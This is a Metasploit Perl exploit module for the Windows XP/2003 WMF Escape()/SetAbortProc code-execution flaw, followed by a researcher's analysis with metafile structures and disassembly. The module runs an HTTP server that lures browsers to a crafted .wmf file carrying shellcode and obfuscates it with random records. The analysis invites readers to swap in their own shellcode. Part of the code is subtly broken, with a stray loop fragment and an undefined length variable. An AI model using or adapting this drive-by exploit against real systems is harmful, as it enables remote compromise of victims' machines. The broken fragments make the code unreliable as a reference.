Windows XP/2003 Metafile Escape() Code Execution Exploit (meta)
===============================================================

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::ie_xp_pfv_metafile;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket::INET;

my $advanced =
  {
  };

my $info =
  {
	&#039;Name&#039;           => &#039;Windows XP/2003 Metafile Escape() SetAbortProc Code Execution&#039;,
	&#039;Version&#039;        => &#039;$Revision: 1.8 $&#039;,
	&#039;Authors&#039;        =>
	  [
		&#039;H D Moore <hdm [at] metasploit.com&#039;,
		&#039;san <san [at] xfocus.org>&#039;,
		&#039;O600KO78RUS[at]unknown.ru&#039;
	  ],

	&#039;Description&#039;    =>
	  Pex::Text::Freeform(qq{
			This module exploits a vulnerability in the GDI library included with
			Windows XP and 2003. This vulnerability uses the &#039;Escape&#039; metafile function
			to execute arbitrary code through the SetAbortProc procedure. This module
			generates a random WMF record stream for each request.
}),

	&#039;Arch&#039;           => [ &#039;x86&#039; ],
	&#039;OS&#039;             => [ &#039;win32&#039;, &#039;winxp&#039;, &#039;win2003&#039; ],
	&#039;Priv&#039;           => 0,

	&#039;UserOpts&#039;       =>
	  {
		&#039;HTTPPORT&#039; => [ 1, &#039;PORT&#039;, &#039;The local HTTP listener port&#039;, 8080      ],
		&#039;HTTPHOST&#039; => [ 0, &#039;HOST&#039;, &#039;The local HTTP listener host&#039;, "0.0.0.0" ],
	  },

	&#039;Payload&#039;        =>
	  {
		&#039;Space&#039;    => 1000 + int(rand(256)) * 4,
		&#039;BadChars&#039; => "\x00",
		&#039;Keys&#039;     => [&#039;-bind&#039;],
	  },
	&#039;Refs&#039;           =>
	  [
	  	[&#039;BID&#039;, &#039;16074&#039;],
		[&#039;CVE&#039;, &#039;2005-4560&#039;],
	  	[&#039;OSVDB&#039;, &#039;21987&#039;],
		[&#039;MIL&#039;, &#039;111&#039;],	
		[&#039;URL&#039;, &#039;http://wvware.sourceforge.net/caolan/ora-wmf.html&#039;],
		[&#039;URL&#039;, &#039;http://www.geocad.ru/new/site/Formats/Graphics/wmf/wmf.txt&#039;],
	  ],

	&#039;DefaultTarget&#039;  => 0,
	&#039;Targets&#039;        =>
	  [
		[ &#039;Automatic - Windows XP / Windows 2003&#039; ]
	  ],
	
	&#039;Keys&#039;           => [ &#039;wmf&#039; ],

	&#039;DisclosureDate&#039; => &#039;Dec 27 2005&#039;,
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;
	my $server = IO::Socket::INET->new(
		LocalHost => $self->GetVar(&#039;HTTPHOST&#039;),
		LocalPort => $self->GetVar(&#039;HTTPPORT&#039;),
		ReuseAddr => 1,
		Listen    => 1,
		Proto     => &#039;tcp&#039;
	);
	my $client;

	# Did the listener create fail?
	if (not defined($server)) {
		$self->PrintLine("[-] Failed to create local HTTP listener on " . $self->GetVar(&#039;HTTPPORT&#039;));
		return;
	}
	
	my $httphost = $self->GetVar(&#039;HTTPHOST&#039;);
	if ($httphost eq &#039;0.0.0.0&#039;) {
		$httphost = Pex::Utils::SourceIP(&#039;1.2.3.4&#039;);
	}

	$self->PrintLine("[*] Waiting for connections to http://". $httphost .":". $self->GetVar(&#039;HTTPPORT&#039;) ."/");

	while (defined($client = $server->accept())) {
		$self->HandleHttpClient(Msf::Socket::Tcp->new_from_socket($client));
	}

	return;
}

sub HandleHttpClient
{
	my $self = shift;
	my $fd   = shift;

	# Set the remote host information
	my ($rport, $rhost) = ($fd->PeerPort, $fd->PeerAddr);
		

	# Read the HTTP command
	my ($cmd, $url, $proto) = split / /, $fd->RecvLine(10);

 	
	if ($url !~ /\.wmf/i) {
		$self->PrintLine("[*] HTTP Client connected from $rhost:$rport, redirecting...");
		
		# XXX This could be replaced by obfuscated javascript too...
		
		# Transmit the HTTP redirect response
		$fd->Send(
			"HTTP/1.0 302 Moved\r\n" .
			"Location: /". Pex::Text::AlphaNumText(int(rand(1024)+1))  .".wmf\r\n" .
			"Content-Type: text/html\r\n" .
			"Content-Length: 0\r\n" .
			"Connection: close\r\n" .
			"\r\n"
		  );

		$fd->Close();
		
		return;		
	}
	
	my $shellcode = $self->GetVar(&#039;EncodedPayload&#039;)->Payload;

	# Push our minimum length just over the ethernet MTU
	my $suf_mlen = rand(8192)+128;
	
	# The number of random objects we generated
	my $fill = 0;
	
	# The buffer of random bogus objects
	my $suf_buff = "";

		$fill += 1;
	}

	while (length($suf_buff) < $suf_mlen && $fill < 65535) {
		$suf_buff .= RandomWMFRecord();
		$fill += 1;
	}

	my $content =
		#
		# WindowsMetaHeader
		#
		pack(&#039;vvvVvVv&#039;,
				# WORD  FileType;       /* Type of metafile (0=memory, 1=disk, 2=fjear) */
				2,
				# WORD  HeaderSize;     /* Size of header in WORDS (always 9) */
				9,
				# WORD  Version;        /* Version of Microsoft Windows used */
				0x0300,
				# DWORD FileSize;       /* Total size of the metafile in WORDs */
				$clen/2,
				# WORD  NumOfObjects;   /* Number of objects in the file */
				$fill+1,
				# DWORD MaxRecordSize;  /* The size of largest record in WORDs */
				int(rand(64)+8),
				# WORD  NumOfParams;    /* Not Used (always 0) */
				0
		).
		#
		# Filler data
		#
		#
		# StandardMetaRecord - Escape()
		#
		pack(&#039;Vvv&#039;,
			# DWORD Size;          /* Total size of the record in WORDs */
			4,
			# WORD  Function;      /* Function number (defined in WINDOWS.H) */
			0x0026,                # Can also be 0xff26, 0x0626, etc...
			# WORD  Parameters[];  /* Parameter values passed to function */
			9,
		). $shellcode .
		#
		# Filler data
		#
		$suf_buff.
		#
		# Complete the structure
		#
		pack(&#039;Vv&#039;,
			3,
			0
		);

	
	$self->PrintLine("[*] HTTP Client connected from $rhost:$rport, sending ".length($shellcode)." bytes of payload...");


	# Transmit the HTTP response
	my $req = 		
		"HTTP/1.0 200 OK\r\n" .
		"Content-Type: text/plain\r\n" .
		"Content-Length: " . length($content) . "\r\n" .
		"Connection: close\r\n" .
		"\r\n" .
		$content;
		
		
	my $res = $fd->Send($req);

	# Prevents IE from throwing an error in some cases
	select(undef, undef, undef, 0.1);
	
	$fd->Close();
	
	# The Content-Disposition trick was not very reliable (2003 ignores it)
	#    "Content-Disposition: inline; filename=". Pex::Text::AlphaNumText(int(rand(1024)+1)) .".jpg\r\n".
}


sub RandomWMFRecord {
	my $type = int(rand(3));

	if ($type == 0)	{
		# CreatePenIndirect
		return pack(&#039;Vv&#039;,
			8,
			0x02FA
		). Pex::Text::RandomData(10)
	}
	elsif ( $type == 1 ) {
		# CreateBrushIndirect
		return pack(&#039;Vv&#039;,
			7,
			0x02FC
		). Pex::Text::RandomData(8)
	}
	else {
		# Rectangle
		return pack(&#039;Vv&#039;,
			7,
			0x041B
		). Pex::Text::RandomData(8)
	}
}


1;

__END__

Used with permission by san[at]xfocus.org:
------------------------------------------

The recent wmf vul is really fun, I found some interest things after
analysed it. I attached a very simple wmf file(64 bytes) which can crash
your explorer. You can simply change those 0xcc to your shellcode.

An attach wmf file constructs with a 18 bytes metafile header which
defined as following:

typedef struct _WindowsMetaHeader
{
  WORD  FileType;       /* Type of metafile (0=memory, 1=disk) */
  WORD  HeaderSize;     /* Size of header in WORDS (always 9) */
  WORD  Version;        /* Version of Microsoft Windows used */
  DWORD FileSize;       /* Total size of the metafile in WORDs */
  WORD  NumOfObjects;   /* Number of objects in the file */
  DWORD MaxRecordSize;  /* The size of largest record in WORDs */
  WORD  NumOfParams;    /* Not Used (always 0) */
} WMFHEAD;

and two data records which defined as following:

typedef struct _StandardMetaRecord
{
    DWORD Size;          /* Total size of the record in WORDs */
    WORD  Function;      /* Function number (defined in WINDOWS.H) */
    WORD  Parameters[];  /* Parameter values passed to function */
} WMFRECORD;

Somethings that we need to attention:

1. FileSize of _WindowsMetaHeader is in WORDs, don&#039;t forget to divide 2;
2. the attack file is larger than 64 bytes;
3. the last record always has a function number of 0000h, a Size of
00000003h, and no Parameters array;
4. the attack record has a function number of 0626h, which defined in
wingdi.h. 26h is important, it will flow to Escape function. I found
it will lead to SetAbortProc only the Parameters[0] is 0009h.

.text:77C4B65C loc_77C4B65C:                           ; CODE XREF: PlayMetaFileRecord+43j
.text:77C4B65C                                         ; DATA XREF: .text:off_77C769FE+o
.text:77C4B65C                 push    [ebp+uFlags]    ; case 0x26
.text:77C4B65F                 push    ebx
.text:77C4B660                 call    sub_77C4B68A
.text:77C4B665                 cmp     eax, edi
.text:77C4B667                 mov     [ebp+var_4], eax
.text:77C4B66A                 jnz     loc_77C4B424
.text:77C4B670                 mov     ax, [ebx+6]
.text:77C4B674                 cmp     ax, 0Fh
.text:77C4B678                 jnz     loc_77C5FC0A    ; flow to Escape
...
.text:77C61062 loc_77C61062:                           ; CODE XREF: Escape+ECB7j
.text:77C61062                 sub     edi, 6
.text:77C61065                 jz      short loc_77C61090 ; it flow to SetAbortProc only the Parameters[0] is 0009h
...
.text:77C543E7 loc_77C543E7:                           ; CODE XREF: SetAbortProc+54j
.text:77C543E7                                         ; SetAbortProc+10720tj
.text:77C543E7                 xor     eax, eax
.text:77C543E9                 mov     [esi+14h], edi  ; write callback pointer?
...
.text:77C604C8 owned:                                  ; CODE XREF: sub_77C4B09C+1E4j
.text:77C604C8                 mov     eax, [eax+14h]  ; the pointer
.text:77C604CB                 cmp     eax, ecx
.text:77C604CD                 jz      loc_77C4B286
.text:77C604D3                 push    ecx
.text:77C604D4                 push    edi
.text:77C604D5                 call    eax             ; got it

Best Regards
--
san <san[at]xfocus.org>


